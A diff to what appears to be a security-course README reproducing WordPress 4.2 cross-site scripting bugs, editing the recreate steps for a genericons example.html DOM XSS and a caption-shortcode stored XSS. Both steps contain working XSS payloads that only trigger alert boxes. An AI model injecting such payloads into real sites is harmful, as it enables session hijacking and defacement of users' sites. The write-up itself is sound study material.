@@ -27,7 +27,7 @@ Time spent: **17** hours spent in total
    - Fixed in version: 4.2.2
   - [X] GIF Walkthrough: 
   - [X] Steps to recreate:
-  - Edit a new post, and insert  http:// site.com/wp-content/themes/twentyfifteen/genericons/example.html#1<img/ src=1 onerror= alert(2)> and press preview.  Then 2 will pop up in the new window. 
+  - Edit a new post, and insert  http:// site.com/wp-content/themes/twentyfifteen/genericons/example.html#1<img/ src=1 onerror= alert(1)> and press preview.  Then 1 will pop up in the new window. 
   - [X] Affected source code:
     
 ### 3. (Required) Cross-Site Scripting 
@@ -47,7 +47,7 @@ Time spent: **17** hours spent in total
    - Fixed in version: 4.2.2
   - [X] GIF Walkthrough: 
   - [X] Steps to recreate: 
-  - Edit a new post, and insert  <a href="[caption code=">]</a><a title =" onmouseover=alert('Exploit 4!') "> click the link.</a> in the content link. Once you click the link the window will pop up. 
+  - Edit a new post, and insert  <a href="[caption code=">]</a><a title =" onmouseover=alert('Exploit4!') "> dont click the link.</a> in the content link. Once you click the link the 'Exploit4!' window will pop up. 
   - [X] Affected source code:
    
 
